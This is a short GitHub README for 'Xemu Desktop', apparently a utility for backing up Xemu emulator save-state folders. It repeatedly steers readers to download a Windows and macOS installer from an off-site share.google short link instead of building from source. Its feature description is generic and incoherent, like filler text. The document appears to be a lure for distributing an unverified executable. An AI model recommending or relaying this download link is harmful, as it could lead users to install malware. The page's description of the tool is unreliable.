![Xemu Desktop](assets/hero.png)

# Xemu Desktop

*Keep the Xemu save-state folder tidy before an update.*

## About

This repository is **Xemu Desktop**, a Windows utility. Keep the Xemu save-state folder tidy before an update.

Xemu drops save-state files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Finds the Xemu save-state directory.
- Copies config and BIOS-path files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Xemu desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/johnmartin480/xemu-desktop

MIT license. See `LICENSE`.
